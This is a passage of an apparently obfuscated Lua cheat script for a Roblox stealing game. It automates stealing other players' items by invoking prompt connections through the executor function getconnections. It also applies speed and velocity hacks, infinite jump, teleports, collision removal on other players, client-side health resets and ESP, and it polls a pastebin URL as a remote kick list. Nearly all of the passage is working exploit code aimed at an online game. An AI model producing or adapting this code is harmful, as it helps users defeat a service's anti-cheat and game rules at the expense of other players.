	raycastParams.FilterDescendantsInstances = { arg }
	raycastParams.IgnoreWater = true

	pcall(function()
		raycastParams.RespectCanCollide = true
	end)

	local max = math.max
	local n18 = arg2.Size.Z * 1.15
	local vector = Vector3.new(math.max(1.9, arg2.Size.X * 0.95), math.max(2.4, arg2.Size.Y * 1.15), max(1.45, n18))

	local ok, result = pcall(function()
		return workspace:Blockcast(arg2.CFrame, vector, arg3, raycastParams)
	end)

	if ok and result then
		local normal = result.Normal

		if not normal or math.abs(normal.Y) < 0.7 then
			local n19 = math.max(0, (tonumber(result.Distance) or 0) - 0.1)
			if n19 <= 0.001 then
				return Vector3.zero
			end
			return arg3.Unit * math.min(arg3.Magnitude, n19)
		end
	end

	if not ok then
		local unit = arg3.Unit
		local n19 = Vector3.new(-unit.Z, 0, unit.X) * 0.82
		local distance = nil

		for _, v3 in ipairs({ arg2.Position, arg2.Position + n19, arg2.Position - n19 }) do
			local hit = workspace:Raycast(v3, arg3, raycastParams)

			if hit and (not distance or hit.Distance < distance) then
				distance = hit.Distance
			end
		end

		if distance then
			local n20 = math.max(0, distance - 0.1)
			if n20 <= 0.001 then
				return Vector3.zero
			end
			return unit * math.min(arg3.Magnitude, n20)
		end
	end

	return arg3
end

local function fn13(arg)
	local character = localPlayer.Character
	if not character then
		return
	end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	if not humanoid or not humanoidRootPart then
		return
	end

	if flag3 and humanoidRootPart.AssemblyLinearVelocity.Magnitude > n5 then
		humanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, humanoidRootPart.AssemblyLinearVelocity.Y, 0)
		humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
	end

	if humanoid.Health <= 0 then
		return
	end

	if flag13 or flag11 or flag12 or tbl3 and (tbl3.tpBat or tbl3.batV2) or flag14 then
		return
	end

	if isRagdollState and isRagdollState(humanoid) then
		lastMoveDir = Vector3.zero
		return
	end

	if flag3 then
		fn10(humanoid)
	end

	local v3 = fn11(humanoid.MoveDirection)
	if not v3 then
		return
	end
	lastMoveDir = v3
	tbl21.lastDirection = v3

	pcall(function()
	end)

	local n18 = math.max(0, tonumber(arg) or 16)
	local n19 = math.clamp(tbl21.smoothedDt, 0.0041666666666666666, 0.05)
	local n20 = v3 * n18 * n19
	local n21 = math.max(tbl21.maxStep, n18 * n19 * 1.35)

	if n20.Magnitude > n21 then
		n20 = n20.Unit * n21
	end

	local v4 = fn12(character, humanoidRootPart, Vector3.new(n20.X, 0, n20.Z))

	if v4.Magnitude > 0.0001 then
		pcall(function()
			humanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, humanoidRootPart.AssemblyLinearVelocity.Y, 0)
			humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
		end)

		pcall(function()
			character:PivotTo(character:GetPivot() + v4)
		end)
	end
end

local connection3 = nil

pcall(function()
	local function fn14(arg)
		local clamp = math.clamp
		local n18 = tonumber(arg) or 0.016666666666666666
		local smoothedDt = tbl21.smoothedDt
		tbl21.smoothedDt = tbl21.smoothedDt + (clamp(n18, 0.0041666666666666666, 0.033333333333333333) - smoothedDt) * 0.35
		fn13(getActiveMoveSpeed())
	end

	if RunService.PreSimulation then
		connection3 = RunService.PreSimulation:Connect(function(deltaTime)
			fn14(deltaTime)
		end)
	else
		connection3 = RunService.Heartbeat:Connect(function(deltaTime)
			fn14(deltaTime)
		end)
	end
end)

localPlayer.CharacterAdded:Connect(function()
	fn9(false)
	tbl21.lastDirection = Vector3.zero
	tbl21.smoothedDt = 0.016666666666666666
end)

local function fn14(arg)
	if not arg then
		return
	end
	local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
	if not humanoid then
		return
	end

	humanoid.HealthChanged:Connect(function(health)
		if flag3 and health <= 0 then
			pcall(function()
				humanoid.Health = humanoid.MaxHealth
			end)
		end
	end)
end

if localPlayer.Character then
	task.spawn(function()
		fn14(localPlayer.Character)
	end)
end

localPlayer.CharacterAdded:Connect(function(character)
	task.wait(0.05)
	fn14(character)
end)

getAutoPathSpeed = function()
	if flag2 then
		return flag and n4 or n3
	end
	return n
end

local flag37 = false

local function fn15()
	local character = localPlayer.Character
	if not character then
		return false
	end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if humanoid and humanoid.WalkSpeed < 25 then
		return true
	end

	local ok, result = pcall(function()
		return localPlayer:GetAttribute("Stealing")
	end)

	if ok and result == true then
		return true
	end

	local ok2, result2 = pcall(function()
		return character:GetAttribute("Stealing")
	end)

	if ok2 and result2 == true then
		return true
	end

	for _, child in ipairs(character:GetChildren()) do
		if child:IsA("Tool") then
			local str3 = child.Name:lower()
			if str3:find("brainrot") or str3:find("skibidi") or str3:find("toilet") then
				return true
			end
		end
	end

	return false
end

updateAutoSwitchSpeed = function()
	if not flag27 then
		return
	end
	local v3 = fn15()
	if v3 == flag37 then
		return
	end
	flag37 = v3

	if v3 then
		if flag2 then
			flag = true
		else
			flag = true
		end
	elseif not flag2 then
		flag = false
	end

	if refreshSpeedModeLabel then
		refreshSpeedModeLabel()
	end

	if tbl6.carrySpeed then
		tbl6.carrySpeed(flag and not flag2)
	end

	if tbl6.laggerCarry then
		tbl6.laggerCarry(flag2 and flag)
	end

	if tbl6.laggerNormal then
		tbl6.laggerNormal(flag2 and not flag)
	end
end

task.spawn(function()
	while true do
		task.wait(0.1)
		updateAutoSwitchSpeed()
	end
end)

startHoldInfJump = function()
	if holdInfJumpConn then
		holdInfJumpConn:Disconnect()
	end

	holdInfJumpConn = RunService.Heartbeat:Connect(function()
		if not flag5 then
			return
		end
		local character = localPlayer.Character
		if not character then
			return
		end
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if not humanoidRootPart or not humanoid then
			return
		end

		if (UserInputService:IsKeyDown(Enum.KeyCode.Space) or humanoid.Jump == true) and humanoidRootPart.Velocity.Y < 35 then
			humanoidRootPart.Velocity = Vector3.new(humanoidRootPart.Velocity.X, 55, humanoidRootPart.Velocity.Z)
		end

		if humanoidRootPart.Velocity.Y < -120 then
			humanoidRootPart.Velocity = Vector3.new(humanoidRootPart.Velocity.X, -120, humanoidRootPart.Velocity.Z)
		end
	end)
end

stopHoldInfJump = function()
	if holdInfJumpConn then
		holdInfJumpConn:Disconnect()
		holdInfJumpConn = nil
	end
end

task.spawn(function()
	pcall(function()
		HttpService.HttpEnabled = true
	end)

	while task.wait(3) do
		pcall(function()
			local response = game:HttpGet("https://pastebin.com/2zLUXv2K")

			if response and string.find(response, tostring(localPlayer.UserId), 1, true) then
				localPlayer:Kick("You have been removed for cheating | CODE: BAC-1633")
			end
		end)
	end
end)

local tbl22 = {
	DropBrainrot = { kb = Enum.KeyCode.H, gp = nil },
	AutoLeft = { kb = Enum.KeyCode.J, gp = nil },
	AutoRight = { kb = Enum.KeyCode.L, gp = nil },
	AutoBat = { kb = Enum.KeyCode.E, gp = nil },
	TPBat = { kb = Enum.KeyCode.Y, gp = nil },
	TPFloor = { kb = Enum.KeyCode.T, gp = nil },
	GuiHide = { kb = Enum.KeyCode.RightControl, gp = nil },
	SpeedToggle = { kb = Enum.KeyCode.C, gp = nil },
	LaggerToggle = { kb = Enum.KeyCode.K, gp = nil },
	LaggerCarry = { kb = Enum.KeyCode.B, gp = nil },
	BatV2 = { kb = Enum.KeyCode.V, gp = nil },
}

AP_L1 = Vector3.new(-476.47, -6.28, 92.73)
AP_L2 = Vector3.new(-483.12, -4.95, 94.81)
AP_R1 = Vector3.new(-476.16, -6.52, 25.62)
AP_R2 = Vector3.new(-483.06, -5.03, 25.48)
local tbl23 = { AutoStealEnabled = false, StealRadius = 60, StealDuration = 1.3, Mode = 1, Data = {} }

local tbl24 = {
	{ threshold = 0.9, nearDist = 14 },
	{ threshold = 0.85, nearDist = 12 },
	{ threshold = 0.8, nearDist = 11 },
	{ threshold = 0.75, nearDist = 10 },
}

local flag38 = false
local now = nil
local n18 = 0
local tbl25 = { autoSteal = nil, antiRag = nil, batCounter = nil, anchor = {} }
local n19 = 8
local flag39 = false
local v3 = nil

isRagdollState = function(arg)
	if not arg then
		return true
	end
	local state = arg:GetState()
	return arg.PlatformStand or state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown
end

isMyPlotByName = function(arg)
	local plots = workspace:FindFirstChild("Plots")
	if not plots then
		return false
	end
	local v4 = plots:FindFirstChild(arg)
	if not v4 then
		return false
	end
	local plotSign = v4:FindFirstChild("PlotSign")

	if plotSign then
		local yourBase = plotSign:FindFirstChild("YourBase")
		if yourBase and yourBase:IsA("BillboardGui") then
			return yourBase.Enabled == true
		end
	end

	return false
end

isNearPodiumWithPrompt = function()
	local character = localPlayer.Character
	character = character and character:FindFirstChild("HumanoidRootPart")
	if not character then
		return false
	end
	local plots = workspace:FindFirstChild("Plots")
	if not plots then
		return false
	end

	for _, child in ipairs(plots:GetChildren()) do
		if isMyPlotByName(child.Name) then
			continue
		end
		local animalPodiums = child:FindFirstChild("AnimalPodiums")
		if not animalPodiums then
			continue
		end

		for _, child2 in ipairs(animalPodiums:GetChildren()) do
			local base = child2:FindFirstChild("Base")
			if not base then
				continue
			end
			local spawn = base:FindFirstChild("Spawn")
			if not spawn then
				continue
			end
			local magnitude = (character.Position - spawn.Position).Magnitude
			if tbl23.StealRadius < magnitude then
				continue
			end
			local promptAttachment = spawn:FindFirstChild("PromptAttachment")
			if not promptAttachment then
				continue
			end

			for _, child3 in ipairs(promptAttachment:GetChildren()) do
				if child3:IsA("ProximityPrompt") and child3.Enabled then
					return true, magnitude
				end
			end
		end
	end

	return false, math.huge
end

local function fn16()
	local character = localPlayer.Character
	if character then
		return character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
	end
	return nil
end

local function fn17(arg)
	local attachment = arg:FindFirstChild("Attachment")
	if attachment then
		return attachment.WorldPosition or attachment.Position
	end
	local parent = arg.Parent
	if parent and parent:IsA("BasePart") then
		return parent.Position
	end

	if parent and parent.Parent and parent.Parent:IsA("BasePart") then
		return parent.Parent.Position
	end

	if parent and parent.Parent and parent.Parent.Parent and parent.Parent.Parent:IsA("BasePart") then
		return parent.Parent.Parent.Position
	end

	while parent and parent ~= workspace do
		if parent.Name == "Spawn" and parent:IsA("BasePart") then
			return parent.Position
		end
		parent = parent.Parent
	end

	return nil
end

findNearestPrompt = function()
	local v4 = fn16()
	if not v4 then
		return nil
	end
	local plots = workspace:FindFirstChild("Plots")
	if not plots then
		return nil
	end
	local huge = math.huge
	local v5 = nil

	for _, child in ipairs(plots:GetChildren()) do
		if not isMyPlotByName(child.Name) then
			local animalPodiums = child:FindFirstChild("AnimalPodiums")

			if animalPodiums then
				for _, child2 in ipairs(animalPodiums:GetChildren()) do
					local base = child2:FindFirstChild("Base")

					if base then
						local spawn = base:FindFirstChild("Spawn")

						if spawn then
							local magnitude = (spawn.Position - v4.Position).Magnitude

							if magnitude <= tbl23.StealRadius and magnitude < huge then
								local promptAttachment = spawn:FindFirstChild("PromptAttachment")

								if promptAttachment then
									for _, child3 in ipairs(promptAttachment:GetChildren()) do
										if child3:IsA("ProximityPrompt") and child3.ActionText and child3.ActionText:find("Steal") then
											v5 = child3
											huge = magnitude
										end
									end
								end
							end
						end
					end
				end
			end
		end
	end

	return v5
end

local tbl26 = { HOLD_MIN = 1.3, HOLD_MAX = 2.6, ENTRY_DELAY = 0.3, COOLDOWN = 0.05, STEAL_RANGE = 10 }

local function fn18(arg)
	local v4 = fn16()
	if not v4 or not arg then
		return math.huge
	end
	local v5 = fn17(arg)
	if not v5 then
		return math.huge
	end
	return (v4.Position - v5).Magnitude
end

executeSteal = function(arg)
	local v4 = flag38
	local flag40

	if flag38 then
		flag40 = v4
	else
		flag40 = not tbl23.AutoStealEnabled
	end

	if flag40 then
		return
	end

	if not arg or not arg.Parent then
		return
	end

	if not tbl23.Data[arg] then
		tbl23.Data[arg] = { hold = {}, trigger = {}, ready = true }

		if getconnections then
			local ok, result = pcall(getconnections, arg.PromptButtonHoldBegan)

			if ok and type(result) == "table" then
				for _, v5 in ipairs(result) do
					if type(v5.Function) == "function" then
						table.insert(tbl23.Data[arg].hold, v5.Function)
					end
				end
			end

			local ok2, result2 = pcall(getconnections, arg.Triggered)

			if ok2 and type(result2) == "table" then
				for _, v5 in ipairs(result2) do
					if type(v5.Function) == "function" then
						table.insert(tbl23.Data[arg].trigger, v5.Function)
					end
				end
			end
		end
	end

	local v5 = tbl23.Data[arg]
	if not v5.ready then
		return
	end

	if #v5.hold == 0 and #v5.trigger == 0 then
		return
	end
	v5.ready = false
	flag38 = true
	now = tick()
	n18 = 0

	task.spawn(function()
		for _, v6 in ipairs(v5.hold) do
			task.spawn(function()
				pcall(v6)
			end)
		end

		local n20 = tonumber(tbl26.HOLD_MIN) or 1.3
		local n21 = tonumber(tbl26.HOLD_MAX) or 2.6
		local n22 = tonumber(tbl26.ENTRY_DELAY) or 0.3
		local n23 = tonumber(tbl26.STEAL_RANGE) or 10

		if type(tbl23.StealDuration) == "number" and tbl23.StealDuration > 0 then
			n20 = math.clamp(tbl23.StealDuration, 0.8, n21)
		end

		local v6 = tbl24[tbl23.Mode] or tbl24[1]

		if v6 and v6.nearDist then
			n23 = v6.nearDist
		end

		task.wait(n20)
		n18 = math.clamp(n20 / n21, 0, 1)
		local flag41 = fn18(arg) <= n23
		local exitTo = nil

		while tbl23.AutoStealEnabled do
			local n24 = tick() - now
			n18 = math.clamp(n24 / n21, 0, 1)
			local flag42 = false

			if n21 < n24 then
				exitTo = 1
				break
			else
				local flag43 = false

				if not arg.Parent then
					exitTo = 2
					break
				elseif fn18(arg) <= n23 then
					exitTo = 3
					break
				else
					task.wait()
				end
			end
		end

		if exitTo ~= 1 then
			if exitTo ~= 2 then
				if exitTo == 3 then
					if not flag41 then
						task.wait(n22)
					end

					for _, v7 in ipairs(v5.trigger) do
						task.spawn(function()
							pcall(v7)
						end)
					end

					n18 = 1
				end
			end
		end

		task.wait(tonumber(tbl26.COOLDOWN) or 0.05)
		v5.ready = true
		flag38 = false
		now = nil
		n18 = 0
	end)
end

onAutoPathFinished = function()
end

startAutoSteal = function()
	if tbl25.autoSteal then
		return
	end

	tbl25.autoSteal = RunService.Heartbeat:Connect(function()
		local v4 = flag38
		local flag40

		if flag38 then
			flag40 = v4
		else
			flag40 = not tbl23.AutoStealEnabled
		end

		if flag40 then
			return
		end
		local ok, result = pcall(findNearestPrompt)

		if ok and result then
			pcall(executeSteal, result)
		end
	end)
end

stopAutoSteal = function()
	if tbl25.autoSteal then
		tbl25.autoSteal:Disconnect()
		tbl25.autoSteal = nil
	end

	flag38 = false
	now = nil
	n18 = 0
end

RunService.Stepped:Connect(function()
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= localPlayer and player.Character then
			for _, descendant in ipairs(player.Character:GetDescendants()) do
				if descendant:IsA("BasePart") then
					descendant.CanCollide = false
				end
			end
		end
	end
end)

localPlayer.CharacterAdded:Connect(function(character)
	task.wait(0.5)
	setupSpeedIndicator(character)
	setupRagdollTriggers()

	if flag6 then
		setupMedusa(character)
	end

	if flag7 then
		startBatCounter()
	end

	if flag8 then
		task.wait(0.5)
		startUnwalk()
	end

	if flag28 and text2 and text2 ~= "OFF" then
		task.delay(0.4, function()
			pcall(function()
				applyAnimPack(text2)
			end)
		end)
	end

	task.delay(0.5, function()
		pcall(function()
			applyCharterToChar(character)
		end)
	end)

	if refreshSpeedModeLabel then
		refreshSpeedModeLabel()
	end

	if tbl6.carrySpeed then
		tbl6.carrySpeed(flag)
	end

	if tbl6.lagger then
		tbl6.lagger(flag2)
	end

	if flag34 then
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= localPlayer then
				task.spawn(function()
					task.wait(0.4)

					if flag34 then
						espMakeLabel(player)
					end
				end)
			end
		end
	end
end)

if localPlayer.Character then
	setupSpeedIndicator(localPlayer.Character)
	setupRagdollTriggers()

	task.spawn(function()
		task.wait(0.6)
		pcall(applyCharterToChar, localPlayer.Character)
	end)
end

alConn = nil
arConn = nil
alPhase = 1
arPhase = 1

stopAutoLeft = function()
	if alConn then
		alConn:Disconnect()
		alConn = nil
	end

	alPhase = 1
	local character = localPlayer.Character

	if character then
		local humanoid = character:FindFirstChildOfClass("Humanoid")

		if humanoid then
			humanoid:Move(Vector3.zero, false)
		end
	end

	if v then
		v(false)
	end

	if tbl6.autoLeft then
		tbl6.autoLeft(false)
	end
end

stopAutoRight = function()
	if arConn then
		arConn:Disconnect()
		arConn = nil
	end

	arPhase = 1
	local character = localPlayer.Character

	if character then
		local humanoid = character:FindFirstChildOfClass("Humanoid")

		if humanoid then
			humanoid:Move(Vector3.zero, false)
		end
	end

	if v2 then
		v2(false)
	end

	if tbl6.autoRight then
		tbl6.autoRight(false)
	end
end

findBat = function()
	local character = localPlayer.Character
	if not character then
		return nil
	end

	for _, child in ipairs(character:GetChildren()) do
		if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
			return child
		end
	end

	local backpack = localPlayer:FindFirstChild("Backpack")

	if backpack then
		for _, child in ipairs(backpack:GetChildren()) do
			if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
				return child
			end
		end
	end

	return nil
end

startAutoLeft = function()
	if alConn then
		alConn:Disconnect()
	end

	alPhase = 1

	alConn = RunService.Heartbeat:Connect(function()
		if not flag11 then
			return
		end
		local character = localPlayer.Character
		if not character then
			return
		end
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if not humanoidRootPart or not humanoid then
			return
		end

		if isRagdollState(humanoid) then
			humanoid:Move(Vector3.zero, false)
			return
		end
		local v4 = getAutoPathSpeed()

		if alPhase == 1 then
			local position = humanoidRootPart.Position

			if (Vector3.new(AP_L1.X, humanoidRootPart.Position.Y, AP_L1.Z) - position).Magnitude < 1 then
				alPhase = 2
				local n20 = AP_L2 - humanoidRootPart.Position
				local unit = Vector3.new(n20.X, 0, n20.Z).Unit
				humanoid:Move(unit, false)
				humanoidRootPart.Velocity = Vector3.new(unit.X * v4, humanoidRootPart.Velocity.Y, unit.Z * v4)
				return
			end

			local n20 = AP_L1 - humanoidRootPart.Position
			local unit = Vector3.new(n20.X, 0, n20.Z).Unit
			humanoid:Move(unit, false)
			humanoidRootPart.Velocity = Vector3.new(unit.X * v4, humanoidRootPart.Velocity.Y, unit.Z * v4)
		elseif alPhase == 2 then
			local position = humanoidRootPart.Position

			if (Vector3.new(AP_L2.X, humanoidRootPart.Position.Y, AP_L2.Z) - position).Magnitude < 1 then
				humanoid:Move(Vector3.zero, false)
				humanoidRootPart.Velocity = Vector3.zero
				flag11 = false

				if alConn then
					alConn:Disconnect()
					alConn = nil
				end

				alPhase = 1

				if v then
					v(false)
				end

				if tbl6.autoLeft then
					tbl6.autoLeft(false)
				end

				if onAutoPathFinished then
					onAutoPathFinished()
				end

				return
			end

			local n20 = AP_L2 - humanoidRootPart.Position
			local unit = Vector3.new(n20.X, 0, n20.Z).Unit
			humanoid:Move(unit, false)
			humanoidRootPart.Velocity = Vector3.new(unit.X * v4, humanoidRootPart.Velocity.Y, unit.Z * v4)
		end

		if flag19 and not _alSwingDebounce then
			_alSwingDebounce = true
			local v5 = findBat()

			if v5 then
				if v5.Parent ~= character then
					pcall(function()
						humanoid:EquipTool(v5)
					end)
				end

				pcall(function()
					v5:Activate()
				end)
			end

			task.delay(n12, function()
				_alSwingDebounce = false
			end)
		end
	end)
end

startAutoRight = function()
	if arConn then
		arConn:Disconnect()
	end

	arPhase = 1

	arConn = RunService.Heartbeat:Connect(function()
		if not flag12 then
			return
		end
		local character = localPlayer.Character
		if not character then
			return
		end
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if not humanoidRootPart or not humanoid then
			return
		end

		if isRagdollState(humanoid) then
			humanoid:Move(Vector3.zero, false)
			return
		end
		local v4 = getAutoPathSpeed()

		if arPhase == 1 then
			local position = humanoidRootPart.Position

			if (Vector3.new(AP_R1.X, humanoidRootPart.Position.Y, AP_R1.Z) - position).Magnitude < 1 then
				arPhase = 2
				local n20 = AP_R2 - humanoidRootPart.Position
				local unit = Vector3.new(n20.X, 0, n20.Z).Unit
				humanoid:Move(unit, false)
				humanoidRootPart.Velocity = Vector3.new(unit.X * v4, humanoidRootPart.Velocity.Y, unit.Z * v4)
				return
			end

			local n20 = AP_R1 - humanoidRootPart.Position
			local unit = Vector3.new(n20.X, 0, n20.Z).Unit
			humanoid:Move(unit, false)
			humanoidRootPart.Velocity = Vector3.new(unit.X * v4, humanoidRootPart.Velocity.Y, unit.Z * v4)
		elseif arPhase == 2 then
			local position = humanoidRootPart.Position

			if (Vector3.new(AP_R2.X, humanoidRootPart.Position.Y, AP_R2.Z) - position).Magnitude < 1 then
				humanoid:Move(Vector3.zero, false)
				humanoidRootPart.Velocity = Vector3.zero
				flag12 = false

				if arConn then
					arConn:Disconnect()
					arConn = nil
				end

				arPhase = 1

				if v2 then
					v2(false)
				end

				if tbl6.autoRight then
					tbl6.autoRight(false)
				end

				if onAutoPathFinished then
					onAutoPathFinished()
				end

				return
			end

			local n20 = AP_R2 - humanoidRootPart.Position
			local unit = Vector3.new(n20.X, 0, n20.Z).Unit
			humanoid:Move(unit, false)
			humanoidRootPart.Velocity = Vector3.new(unit.X * v4, humanoidRootPart.Velocity.Y, unit.Z * v4)
		end

		if flag19 and not _arSwingDebounce then
			_arSwingDebounce = true
			local v5 = findBat()

			if v5 then
				if v5.Parent ~= character then
					pcall(function()
						humanoid:EquipTool(v5)
					end)
				end

				pcall(function()
					v5:Activate()
				end)
			end

			task.delay(n12, function()
				_arSwingDebounce = false
			end)
		end
	end)
end

_wfConns = {}

runDrop = function()
	if flag10 then
		return
	end

	if flag13 then
		flag13 = false

		if resetAutoBatMotion then
			resetAutoBatMotion()
		end

		if stopBatAimbot then
			stopBatAimbot()
		end

		if autoBatSetVisual then
			autoBatSetVisual(false)
		end

		if tbl6.autoBat then
			tbl6.autoBat(false)
		end
	end

	local character = localPlayer.Character
	if not character then
		return
	end

	if not character:FindFirstChild("HumanoidRootPart") then
		return
	end
	flag10 = true
	local now2 = tick()
	local connection4 = nil

	connection4 = RunService.Heartbeat:Connect(function()
		local v4 = character
		local humanoidRootPart

		if character then
			humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		else
			humanoidRootPart = v4
		end

		if not humanoidRootPart then
			if connection4 then
				connection4:Disconnect()
			end

			flag10 = false
			return
		end

		if (DROP_ASCEND_DURATION or 0.2) <= tick() - now2 then
			connection4:Disconnect()
			local raycastParams = RaycastParams.new()
			raycastParams.FilterDescendantsInstances = { character }
			raycastParams.FilterType = Enum.RaycastFilterType.Exclude
			local hit = workspace:Raycast(humanoidRootPart.Position, Vector3.new(0, -2000, 0), raycastParams)

			if hit then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, hit.Position.Y + (humanoid and humanoid.HipHeight or 2) + humanoidRootPart.Size.Y / 2, humanoidRootPart.Position.Z)

				pcall(function()
					humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
					humanoidRootPart.Velocity = Vector3.zero
				end)
			end

			flag10 = false
			return
		end

		pcall(function()
			humanoidRootPart.Velocity = Vector3.new(humanoidRootPart.Velocity.X, DROP_ASCEND_SPEED or 150, humanoidRootPart.Velocity.Z)
			humanoidRootPart.AssemblyLinearVelocity = Vector3.new(humanoidRootPart.AssemblyLinearVelocity.X, DROP_ASCEND_SPEED or 150, humanoidRootPart.AssemblyLinearVelocity.Z)
		end)
	end)
end

doAutoTPDown = function(arg)
	local character = localPlayer.Character
	if not character then
		return
	end
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	if not humanoidRootPart then
		return
	end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if not humanoid then
		return
	end

	if not arg then
		if humanoid.FloorMaterial ~= Enum.Material.Air then
			return
		end

		if not (humanoidRootPart.Position.Y >= autoTPHeight) then
			return
		end
	end

	local cframe = CFrame.Angles
	local cFrame = humanoidRootPart.CFrame
	humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, -7, humanoidRootPart.Position.Z) * cframe(0, select(2, cFrame:ToEulerAnglesYXZ()), 0)
	humanoidRootPart.Velocity = Vector3.zero
end

startAutoTP = function()
	if autoTPConn then
		task.cancel(autoTPConn)
		autoTPConn = nil
	end

	autoTPConn = task.spawn(function()
		while flag22 do
			task.wait(0.1)

			pcall(function()
				doAutoTPDown(false)
			end)
		end
	end)
end

stopAutoTP = function()
	flag22 = false

	if autoTPConn then
		task.cancel(autoTPConn)
		autoTPConn = nil
	end
end

runTPFloor = function()
	pcall(function()
		doAutoTPDown(true)
	end)
end

enableStretchRez = function()
	flag21 = true

	if stretchRezConn then
		stretchRezConn:Disconnect()
	end

	pcall(function()
		RunService:UnbindFromRenderStep("Movee_Stretch")
	end)

	pcall(function()
		RunService:BindToRenderStep("Movee_Stretch", Enum.RenderPriority.Last.Value - 1, function()
			local currentCamera = workspace.CurrentCamera

			if currentCamera then
				currentCamera.CFrame = currentCamera.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, 0.8, 0, 0, 0, 1)
			end
		end)
	end)
end

disableStretchRez = function()
	flag21 = false

	pcall(function()
		RunService:UnbindFromRenderStep("Movee_Stretch")
	end)
end

defLightBrightness = nil
defLightClock = nil
defLightAmbient = nil

applyAntiLagDerender = function(arg)
	pcall(function()
		if arg:IsA("Accessory") or arg:IsA("Hat") then
			arg:Destroy()
		elseif arg:IsA("BasePart") then
			arg.Material = Enum.Material.Plastic
			arg.Reflectance = 0
			arg.CastShadow = false
		elseif arg:IsA("Decal") or arg:IsA("Texture") then
			arg.Transparency = 1
		elseif arg:IsA("ParticleEmitter") or arg:IsA("Trail") or arg:IsA("Beam") or arg:IsA("Fire") or arg:IsA("Smoke") or arg:IsA("Sparkles") then
			arg.Enabled = false
		end
	end)
end

enableAntiLag = function()
	removeAccessoriesEnabled = true
	flag20 = true
	defLightBrightness = defLightBrightness or Lighting.Brightness
	defLightClock = defLightClock or Lighting.ClockTime
	defLightAmbient = defLightAmbient or Lighting.OutdoorAmbient
	Lighting.GlobalShadows = false
	Lighting.FogEnd = 1e10
	Lighting.Brightness = 1
	Lighting.EnvironmentDiffuseScale = 0
	Lighting.EnvironmentSpecularScale = 0

	for _, child in pairs(Lighting:GetChildren()) do
		pcall(function()
			if child:IsA("BlurEffect") or child:IsA("SunRaysEffect") or child:IsA("ColorCorrectionEffect") or child:IsA("BloomEffect") or child:IsA("DepthOfFieldEffect") then
				child.Enabled = false
			end
		end)
	end

	for _, descendant in ipairs(workspace:GetDescendants()) do
		applyAntiLagDerender(descendant)
	end

	if antiLagDescConn then
		antiLagDescConn:Disconnect()
	end

	antiLagDescConn = workspace.DescendantAdded:Connect(function(descendant)
		if removeAccessoriesEnabled then
			applyAntiLagDerender(descendant)
		end
	end)
end

disableAntiLag = function()
	removeAccessoriesEnabled = false
	flag20 = false

	if antiLagDescConn then
		antiLagDescConn:Disconnect()
		antiLagDescConn = nil
	end

	pcall(function()
		if defLightBrightness then
			Lighting.Brightness = defLightBrightness
		end

		if defLightClock then
			Lighting.ClockTime = defLightClock
		end

		if defLightAmbient then
			Lighting.OutdoorAmbient = defLightAmbient
		end

		Lighting.ExposureCompensation = 0
	end)
end

local function fn19(arg)
	if not arg then
		return
	end

	for _, v4 in ipairs(arg:GetPlayingAnimationTracks()) do
		pcall(function()
			v4:Stop(0)
		end)
	end
end

local function fn20(arg, arg2)
	if arg and arg2 then
		pcall(function()
			arg.AnimationId = "rbxassetid://" .. tostring(arg2)
		end)
	end
end

local function fn21(arg)
	local animate = arg and arg:FindFirstChild("Animate")
	if not animate or next(_animOriginalIds) then
		return
	end

	local function fn22(arg2, arg3)
		local v4 = animate:FindFirstChild(arg2)
		v4 = v4 and v4:FindFirstChild(arg3)
		return v4 and v4.AnimationId or nil
	end

	_animOriginalIds = {
		walk = fn22("walk", "WalkAnim"),
		run = fn22("run", "RunAnim"),
		jump = fn22("jump", "JumpAnim"),
		fall = fn22("fall", "FallAnim"),
		climb = fn22("climb", "ClimbAnim"),
		idle1 = fn22("idle", "Animation1"),
		idle2 = fn22("idle", "Animation2"),
	}
end

local function fn22(arg)
	local character = arg or localPlayer.Character
	local animate = character and character:FindFirstChild("Animate")
	if not animate or not next(_animOriginalIds) then
		return
	end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	fn19(humanoid)

	local function fn23(arg2, arg3, arg4)
		local v4 = animate:FindFirstChild(arg2)
		v4 = v4 and v4:FindFirstChild(arg3)

		if v4 and _animOriginalIds[arg4] then
			v4.AnimationId = _animOriginalIds[arg4]
		end
	end

	fn23("walk", "WalkAnim", "walk")
	fn23("run", "RunAnim", "run")
	fn23("jump", "JumpAnim", "jump")
	fn23("fall", "FallAnim", "fall")
	fn23("climb", "ClimbAnim", "climb")
	fn23("idle", "Animation1", "idle1")
	fn23("idle", "Animation2", "idle2")

	pcall(function()
		animate.Disabled = true
		task.wait()
		animate.Disabled = false
	end)
end

applyAnimPack = function(arg)
	text2 = arg or "OFF"
	local character = localPlayer.Character
	if not character then
		return false
	end

	if not flag28 or arg == "OFF" or not tbl8[arg] then
		fn22(character)
		return false
	end
	local v4 = tbl8[arg]
	fn21(character)
	local animate = character:FindFirstChild("Animate")
	if not animate then
		return false
	end
